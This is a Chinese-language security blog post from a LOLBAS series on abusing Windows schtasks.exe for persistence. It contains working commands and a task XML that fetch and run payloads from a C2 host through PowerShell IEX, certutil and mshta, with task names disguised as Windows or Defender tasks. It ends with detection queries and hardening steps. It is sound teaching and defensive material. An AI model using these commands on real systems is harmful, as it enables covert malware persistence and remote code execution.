---
title: "LOLBAS鐵人賽Day13Schtasks.exe：排程任務的持續性攻擊技術"
published: 2025-09-27T14:07:00.000Z
description: "LOLBAS 系列第 13 天"
tags: [LOLBAS, Windows, Security]
category: Research
draft: false
---

Schtasks.exe 是 Windows 的排程任務管理工具，用來建立修改執行排定的工作  
雖然這是正常的系統管理功能，但攻擊者也很喜歡用它來建立持續性機制，  
讓惡意程式在特定時間或事件觸發時自動執行

## 排程任務架構

### 任務排程器元件

*   **觸發器 (Trigger)**：何時執行（時間事件開機等）
*   **動作 (Action)**：執行什麼（程式腳本發送郵件）
*   **條件 (Condition)**：執行條件（有電源網路連線等）
*   **設定 (Settings)**：行為設定（失敗重試執行時間限制等）

### 正常的排程任務使用

```cmd
:: 每日備份
schtasks /create /tn "DailyBackup" /tr "C:\Scripts\backup.bat" /sc daily /st 02:00

:: 開機時執行
schtasks /create /tn "StartupScript" /tr "C:\Scripts\init.bat" /sc onstart

:: 閒置時執行維護
schtasks /create /tn "Maintenance" /tr "C:\Scripts\cleanup.bat" /sc onidle /i 10

```

## 攻擊技術

### Step 1: 基本持續性建立

```cmd
:: 設定 C2 伺服器
set C2=<kali_ip>

:: 每小時執行一次
schtasks /create /tn "WindowsUpdate" /tr "powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://%C2%:8080/beacon.ps1')" /sc hourly /f

:: 使用者登入時執行
schtasks /create /tn "OneDriveSync" /tr "cmd /c certutil -urlcache -f http://%C2%:8080/payload.exe %temp%\update.exe && %temp%\update.exe" /sc onlogon /f

:: 系統啟動時執行（需要管理員）
schtasks /create /tn "SystemHealthCheck" /tr "rundll32.exe shell32.dll,ShellExec_RunDLL powershell -enc <base64>" /sc onstart /ru SYSTEM /f

```

### Step 2: 進階隱藏技巧

#### 偽裝成系統任務

```cmd
:: 使用類似系統的名稱
schtasks /create /tn "\Microsoft\Windows\NetTrace\GatherNetworkInfo" /tr "powershell -ep bypass -f C:\Windows\Temp\update.ps1" /sc daily /st 09:00 /f

:: 隱藏在現有路徑下
schtasks /create /tn "\Microsoft\Office\OfficeTelemetryAgent" /tr "mshta http://%C2%:8080/payload.hta" /sc hourly /f

```

#### XML 匯入方式（更彈性）

建立 `task.xml`：

```xml
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>2024-01-01T00:00:00</Date>
    <Author>Microsoft Corporation</Author>
    <Description>Windows Defender Update</Description>
  </RegistrationInfo>
  <Triggers>
    <CalendarTrigger>
      <StartBoundary>2024-01-01T09:00:00</StartBoundary>
      <Repetition>
        <Interval>PT1H</Interval>
      </Repetition>
    </CalendarTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <Hidden>true</Hidden>
    <RunOnlyIfNetworkAvailable>true</RunOnlyIfNetworkAvailable>
    <WakeToRun>false</WakeToRun>
  </Settings>
  <Actions>
    <Exec>
      <Command>powershell.exe</Command>
      <Arguments>-w hidden -ep bypass -c "IEX(irm http://10.211.55.6:8080/beacon.ps1)"</Arguments>
    </Exec>
  </Actions>
</Task>

```

匯入：

```cmd
schtasks /create /xml task.xml /tn "\Microsoft\Windows\Security\DefenderUpdate"

```

### Step 3: 多層觸發機制

```cmd
:: 多重觸發條件
schtasks /create /tn "Updater" /tr "cmd /c calc.exe" /sc daily /st 09:00 /f
schtasks /change /tn "Updater" /tr "cmd /c calc.exe" /sc onlogon
schtasks /change /tn "Updater" /tr "cmd /c calc.exe" /sc onidle /i 10

:: 事件觸發（系統事件）
schtasks /create /tn "EventResponse" /tr "powershell -f C:\Scripts\response.ps1" /sc onevent /ec System /mo "*[System[EventID=7045]]" /f

:: WMI 事件觸發
$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ep bypass -f C:\payload.ps1"
$CIMTrigger = Get-CimClass -Namespace ROOT/Microsoft/Windows/TaskScheduler -ClassName MSFT_TaskEventTrigger
$Trigger = New-CimInstance -CimClass $CIMTrigger -Property @{Enabled=$true; Subscription='<QueryList><Query Id="0"><Select Path="Security">*[System[(EventID=4688)]]</Select></Query></QueryList>'}
Register-ScheduledTask -TaskName "WMITrigger" -Action $Action -Trigger $Trigger

```

## 偵測&防禦

### 檢查可疑任務

```powershell
# 列出所有執行 PowerShell 的任務
Get-ScheduledTask | Where-Object {
    $_.Actions.Execute -match "powershell" -or 
    $_.Actions.Arguments -match "powershell"
} | Select-Object TaskName, TaskPath, State

# 檢查隱藏的任務
Get-ScheduledTask | Where-Object {
    $_.Settings.Hidden -eq $true
} | Select-Object TaskName, TaskPath

# 檢查以 SYSTEM 執行的任務
Get-ScheduledTask | Where-Object {
    $_.Principal.UserId -eq "SYSTEM"
} | Select-Object TaskName, TaskPath, State

```

### 防禦建議

```powershell
# 稽核排程任務建立（Event ID 4698）
auditpol /set /subcategory:"Other Object Access Events" /success:enable /failure:enable

# 限制 schtasks 使用
$acl = Get-Acl "C:\Windows\System32\schtasks.exe"
$permission = "BUILTIN\Users","ReadAndExecute","Deny"
$accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule $permission
$acl.SetAccessRule($accessRule)
Set-Acl "C:\Windows\System32\schtasks.exe" $acl

```

## 關鍵偵測指標

*   非預期的排程任務建立（Event ID 4698）
*   執行編碼的 PowerShell 命令
*   任務名稱偽裝成系統任務
*   隱藏屬性設為 true
*   執行來自 TempDownloads 的程式
*   頻繁的觸發間隔

## 總結！

Schtasks 的危險性：

*   **持續性之王** - 最常用的持續性技術
*   **靈活觸發** - 時間事件條件多樣化
*   **偽裝容易** - 可混在系統任務中
*   **權限提升** - 可以 SYSTEM 身份執行